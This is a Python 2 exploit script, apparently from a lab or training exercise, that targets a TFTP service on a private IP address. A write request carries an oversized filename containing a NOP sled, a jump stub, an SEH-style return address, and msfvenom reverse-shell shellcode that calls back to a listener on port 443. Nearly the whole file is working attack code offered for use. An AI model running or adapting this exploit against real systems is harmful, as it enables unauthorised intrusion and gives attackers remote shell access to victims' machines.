#!/usr/bin/python

import socket
import sys

host = '192.168.100.146'
port = 69

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

except:
    print "socket() failed"

    sys.exit(1)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 EXITFUNC=seh -f python -v shellcode -b "\x00\x2f"
#Payload size: 351 bytes
shellcode =  ""
shellcode += "\xdd\xc4\xd9\x74\x24\xf4\x5a\xbb\xeb\x3e\x6b\xae"
shellcode += "\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x5a\x13\x03\xb1"
shellcode += "\x2d\x89\x5b\xb9\xba\xcf\xa4\x41\x3b\xb0\x2d\xa4"
shellcode += "\x0a\xf0\x4a\xad\x3d\xc0\x19\xe3\xb1\xab\x4c\x17"
shellcode += "\x41\xd9\x58\x18\xe2\x54\xbf\x17\xf3\xc5\x83\x36"
shellcode += "\x77\x14\xd0\x98\x46\xd7\x25\xd9\x8f\x0a\xc7\x8b"
shellcode += "\x58\x40\x7a\x3b\xec\x1c\x47\xb0\xbe\xb1\xcf\x25"
shellcode += "\x76\xb3\xfe\xf8\x0c\xea\x20\xfb\xc1\x86\x68\xe3"
shellcode += "\x06\xa2\x23\x98\xfd\x58\xb2\x48\xcc\xa1\x19\xb5"
shellcode += "\xe0\x53\x63\xf2\xc7\x8b\x16\x0a\x34\x31\x21\xc9"
shellcode += "\x46\xed\xa4\xc9\xe1\x66\x1e\x35\x13\xaa\xf9\xbe"
shellcode += "\x1f\x07\x8d\x98\x03\x96\x42\x93\x38\x13\x65\x73"
shellcode += "\xc9\x67\x42\x57\x91\x3c\xeb\xce\x7f\x92\x14\x10"
shellcode += "\x20\x4b\xb1\x5b\xcd\x98\xc8\x06\x9a\x6d\xe1\xb8"
shellcode += "\x5a\xfa\x72\xcb\x68\xa5\x28\x43\xc1\x2e\xf7\x94"
shellcode += "\x26\x05\x4f\x0a\xd9\xa6\xb0\x03\x1e\xf2\xe0\x3b"
shellcode += "\xb7\x7b\x6b\xbb\x38\xae\x3c\xeb\x96\x01\xfd\x5b"
shellcode += "\x57\xf2\x95\xb1\x58\x2d\x85\xba\xb2\x46\x2c\x41"
shellcode += "\x55\xa9\x19\x2d\x90\x41\x58\xad\xdb\x2a\xd5\x4b"
shellcode += "\xb1\x5c\xb0\xc4\x2e\xc4\x99\x9e\xcf\x09\x34\xdb"
shellcode += "\xd0\x82\xbb\x1c\x9e\x62\xb1\x0e\x77\x83\x8c\x6c"
shellcode += "\xde\x9c\x3a\x18\xbc\x0f\xa1\xd8\xcb\x33\x7e\x8f"
shellcode += "\x9c\x82\x77\x45\x31\xbc\x21\x7b\xc8\x58\x09\x3f"
shellcode += "\x17\x99\x94\xbe\xda\xa5\xb2\xd0\x22\x25\xff\x84"
shellcode += "\xfa\x70\xa9\x72\xbd\x2a\x1b\x2c\x17\x80\xf5\xb8"
shellcode += "\xee\xea\xc5\xbe\xee\x26\xb0\x5e\x5e\x9f\x85\x61"
shellcode += "\x6f\x77\x02\x1a\x8d\xe7\xed\xf1\x15\x19\x1f\xcb"
shellcode += "\x83\x8e\x86\xbe\xe9\xd2\x38\x15\x2d\xeb\xba\x9f"
shellcode += "\xce\x08\xa2\xea\xcb\x55\x64\x07\xa6\xc6\x01\x27"
shellcode += "\x15\xe6\x03"

# 0040484F - POP EDI
filename = "\xcc"*600 + "\x90"*177 + shellcode + "\x90" * 83 + "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1" + "\xeb\xd0\x90\x90" + "\x4f\x48\x40"

#filename = "\x90"*1128 + "\x90" *83 + "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1" + "\xeb\xd0\x90\x90" + "\x4f\x48\x40"

#filename = "\x41"*1232 + "\x4f\x48\x40"

mode = "netascii"

pwned = "\x00\x02" + filename + "\x00" + mode +"\x00"

s.sendto(pwned, (host,port))
